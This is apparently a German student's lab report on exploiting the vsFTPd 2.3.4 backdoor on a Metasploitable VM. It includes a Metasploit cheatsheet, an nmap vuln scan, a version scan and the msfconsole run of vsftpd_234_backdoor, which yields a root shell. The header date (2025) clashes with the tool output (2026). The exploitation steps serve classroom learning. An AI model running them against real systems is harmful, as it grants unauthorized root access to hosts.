# 4AHITS ITSE very safe FTP backdoor

---

Name: Xu Matthias Chen   
Klasse: 4AHITS   
Fach: ITSE   
Datum: 19.01.2025   

---

## Übungen

### Übung (msf Basics)
Probiere alle besprochenen bzw. open beschriebenen msf Befehle noch einmal aus und erstelle ein kurzes Cheatsheet zur Bedienung von metasploit.

Der Befehl setg (set global) ist in unserem Zusammenhang auch sehr praktisch, recherchiere dazu.
Recherchiere zu
msfvenom
Meterpreter

#### Cheatsheet:
- `msfconsole ` Metasploitable öffnen
- `search ... ` man sucht damit Module z.B ssh
- `use ... ` Modul auswählen 
- `info ... ` zeigt Informationen über Author, Optionen und Referenzen
- `set <IP> ` auf das Ziel setzten was man will
- `run ` ausführen
- `setg ...` globale Variablen setzen


msfvenom ist ein Payload-Generator.
Meterpreter ist ein (erweiterter, speicherresidenter) Payload, der nach erfolgreicher Ausführung eine interaktive Session bereitstellt.

### Übung (nmap FTP scan)
Aufgabe: Wiederhole den nmap vuln scan auf den FTP Port. Verwende:

Option --script=vuln (Diese Skripte sind “intrusive” und werden daher nicht über die Optionen -sC oder -A aufgerufen.)

Option -p zum Einschränken auf den FTP Port

Findet nmap die Sicherheitslücke? Recherchiere mit Hilfe der CVE Nummer über diese Sicherheitslücke.

Recherchiere warum diese Skripte als intrusive bezeichnet werden, warum werden diese bei -sC oder -A nicht ausgeführt?


```
$ nmap --script=vuln -p 21 192.168.19.52
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-19 06:35 EST
Nmap scan report for 192.168.19.52
Host is up (0.0063s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-vsftpd-backdoor: 
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2011-2523  BID:48539
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
|     References:
|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
|       https://www.securityfocus.com/bid/48539
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
|_      http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
MAC Address: 00:0C:29:00:14:79 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 25.34 seconds
```

Ja, nmap findet eine Sicherheitslücke.

nmap meldet:

- Dienst: FTP

- Software: vsFTPd

- Version: 2.3.4

- Status: VULNERABLE (Exploitable)

- CVE: CVE-2011-2523

#### CVE-2011-2523

- Betroffen: vsFTPd 2.3.4

- Ursache: Manipulierte Version (Backdoor im Source-Code)

- Veröffentlichungsdatum: Juli 2011

- Sie erlaubt unauthenticated Root-Zugriff

#### Intrusive
--script=vuln ist intrusive, da echte Angriffe simuliert werden

Deshalb werden diese Skripte nicht automatisch bei -sC oder -A ausgeführt


### Übung (msf FTP Version herausfinden)
In dieser Übung findest du mit Hilfe eines msf Moduls ähnliche Informationen wie mit dem vorherigen nmap scan.

Suche nach einem msf Modul mit dem die Version des FTP Servers ermittelt werden kann, du findest dies in der Kategorie scanner .

Verwende dieses Modul um die auf Metasploitable installierte FTP Version herauszufinden.

``` 
$ msfconsole

msf6 > search ftp scanner

Matching Modules
================

   #   Name                                                Disclosure Date  Rank    Check  Description
   -   ----                                                ---------------  ----    -----  -----------
   0   auxiliary/scanner/ftp/anonymous                     .                normal  No     Anonymous FTP Access Detection
   1   auxiliary/scanner/ftp/bison_ftp_traversal           2015-09-28       normal  Yes    BisonWare BisonFTP Server 3.5 Directory Traversal Information Disclosure
   2   auxiliary/scanner/ssh/cerberus_sftp_enumusers       2014-05-27       normal  No     Cerberus FTP Server SFTP Username Enumeration
   3   auxiliary/scanner/snmp/cisco_config_tftp            .                normal  No     Cisco IOS SNMP Configuration Grabber (TFTP)
   4   auxiliary/scanner/snmp/cisco_upload_file            .                normal  No     Cisco IOS SNMP File Upload (TFTP)
   5     \_ action: Override_Config                        .                .       .      Override the running config
   6     \_ action: Upload_File                            .                .       .      Upload the file
   7   auxiliary/scanner/ftp/colorado_ftp_traversal        2016-08-11       normal  Yes    ColoradoFTP Server 1.3 Build 8 Directory Traversal Information Disclosure
   8   auxiliary/scanner/ftp/easy_file_sharing_ftp         2017-03-07       normal  Yes    Easy File Sharing FTP Server 3.6 Directory Traversal
   9   auxiliary/scanner/ftp/ftp_login                     .                normal  No     FTP Authentication Scanner
   10  auxiliary/scanner/portscan/ftpbounce                .                normal  No     FTP Bounce Port Scanner
   11  auxiliary/scanner/ftp/ftp_version                   .                normal  No     FTP Version Scanner
   12  auxiliary/scanner/quake/server_info                 .                normal  No     Gather Quake Server Information
   13    \_ action: info                                   .                .       .      Use the getinfo command
   14    \_ action: status                                 .                .       .      Use the getstatus command
   15  auxiliary/scanner/tftp/ipswitch_whatsupgold_tftp    2011-12-12       normal  No     IpSwitch WhatsUp Gold TFTP Directory Traversal
   16  auxiliary/scanner/ftp/konica_ftp_traversal          2015-09-22       normal  Yes    Konica Minolta FTP Utility 1.00 Directory Traversal Information Disclosure
   17  auxiliary/scanner/rsync/modules_list                .                normal  No     List Rsync Modules
   18  auxiliary/scanner/tftp/netdecision_tftp             2009-05-16       normal  No     NetDecision 4.2 TFTP Directory Traversal
   19  auxiliary/scanner/misc/zenworks_preboot_fileaccess  .                normal  No     Novell ZENworks Configuration Management Preboot Service Remote File Access
   20  auxiliary/scanner/ftp/pcman_ftp_traversal           2015-09-28       normal  Yes    PCMan FTP Server 2.0.7 Directory Traversal Information Disclosure
   21  auxiliary/scanner/tftp/tftpbrute                    .                normal  No     TFTP Brute Forcer
   22  auxiliary/scanner/http/titan_ftp_admin_pwd          .                normal  No     Titan FTP Administrative Password Disclosure
   23  auxiliary/scanner/ftp/titanftp_xcrc_traversal       2010-06-15       normal  No     Titan FTP XCRC Directory Traversal Information Disclosure


Interact with a module by name or index. For example info 23, use 23 or use auxiliary/scanner/ftp/titanftp_xcrc_traversal

msf6 > use auxiliary/scanner/ftp/ftp_version 
msf6 auxiliary(scanner/ftp/ftp_version) > options

Module options (auxiliary/scanner/ftp/ftp_version):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FTPPASS  mozilla@example.com  no        The password for the specified username
   FTPUSER  anonymous            no        The username to authenticate as
   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21                   yes       The target port (TCP)
   THREADS  1                    yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ftp/ftp_version) > set RHOSTS 192.168.19.52
RHOSTS => 192.168.19.52

msf6 auxiliary(scanner/ftp/ftp_version) > run

[+] 192.168.19.52:21      - FTP Banner: '220 (vsFTPd 2.3.4)\x0d\x0a'
[*] 192.168.19.52:21      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

Version: vsFTPd 2.3.4


### Übung (msf vsftpd exploit)
Voraussetzung: Setze Kali und Metasploitable in den NAT Modus.

Starte metasploit aus dem Terminal mit msfconsole (metasploit framework console)

help zeigt einen Hilfetext an.

Verwende search um ein metasploit Modul zu finden dass einen exploit für diese Backdoor zur Verfügung stellt. Hinweis: Suche nach vsftpd

Aktiviere dieses Modul mit use.

Die Anzeige sollte nun so aussehen:

```
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/...) > 
```

Verwende info um Informationen zum aktivierten Modul anzuzeigen. Lies die “Description” durch und finde heraus welche Optionen dieses Modul unterstützt und wie diese gesetzt werden müssen. Setze die notwendigen Optionen.

Verwende den Befehl run um das aktive Modul auszuführen. Es startet eine shell. Verifiziere, dass diese am Metasploit System läuft. Welche Rechte hat diese shell (welcher user)?

Hinterlasse eine Nachricht you have been hacked!die beim nächsten Einloggen dem User msfadmin automatisch angezeigt wird.


```
msf6 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor 
[*] No payload configured, defaulting to cmd/unix/interact

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > info

       Name: VSFTPD v2.3.4 Backdoor Command Execution
     Module: exploit/unix/ftp/vsftpd_234_backdoor
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2011-07-03

Provided by:
  hdm <x@hdm.io>
  MC <mc@metasploit.com>

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic

Check supported:
  No

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT   21               yes       The target port (TCP)

Payload information:
  Space: 2000
  Avoid: 0 characters

Description:
  This module exploits a malicious backdoor that was added to the       VSFTPD download
  archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between
  June 30th 2011 and July 1st 2011 according to the most recent information
  available. This backdoor was removed on July 3rd 2011.

References:
  OSVDB (73573)
  http://pastebin.com/AetT9sS5
  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html


View the full module info with the info -d command.


msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.8.130
RHOSTS => 192.168.8.130
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 192.168.8.130:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.8.130:21 - USER: 331 Please specify the password.
[+] 192.168.8.130:21 - Backdoor service has been spawned, handling...
[+] 192.168.8.130:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.8.129:44879 -> 192.168.8.130:6200) at 2026-01-19 07:17:12 -0500

```


User: Root

